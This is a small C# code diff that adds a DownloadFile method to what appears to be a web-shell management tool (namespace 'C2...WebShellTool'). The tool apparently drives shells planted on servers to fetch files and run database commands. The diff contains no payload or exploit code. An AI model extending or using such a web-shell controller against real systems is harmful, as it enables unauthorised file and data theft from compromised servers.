@@ -132,6 +132,11 @@ namespace C2.Business.CastleBravo.WebShellTool
         {
             return client.ExtractResponse(Post(client.DetailInfo(PageData)));
         }
+
+        public string DownloadFile(string PageData) 
+        {
+            return client.ExtractResponse(Post(client.DownloadFile(PageData)));
+        }
         public string DatabeseInfo(string DBConfig, string database, string command) 
         {
             return client.ExtractResponse(Post(client.GetDatabaseInfo(ChangeDBLoginInfo(DBConfig), database, command)));
